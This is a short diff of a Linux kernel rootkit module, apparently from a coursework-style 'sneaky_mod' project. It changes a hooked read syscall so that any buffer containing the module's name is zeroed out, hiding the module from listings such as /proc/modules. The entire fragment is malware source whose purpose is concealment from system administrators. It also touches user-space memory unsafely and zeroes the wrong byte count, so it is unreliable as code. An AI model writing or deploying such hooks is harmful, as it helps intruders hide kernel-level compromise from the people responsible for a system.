@@ -89,16 +89,20 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 //read
 asmlinkage int (*original_read)(struct pt_regs *);
 asmlinkage int sneaky_read(struct pt_regs *regs) {
-  // int fd = regs->di;
   char *buf = (char *)regs->si;
-  // size_t count = regs->dx;
+  size_t count = regs->dx;
+  int i;
+
 
   int ret = original_read(regs);
 
   const char *name = "sneaky_mod ";
-  char *pos = strstr(buf, name);
-  if(pos) {
-    printk(KERN_INFO "%td\n", pos-buf);
+  // size_t len = strlen(name);
+  char *pos = strnstr(buf, name, 100);
+  if (pos) {
+    for (i = 0 ; i < count ; i++ ) {
+      buf[i] = 0x0;
+    }
   }
 
   return ret;
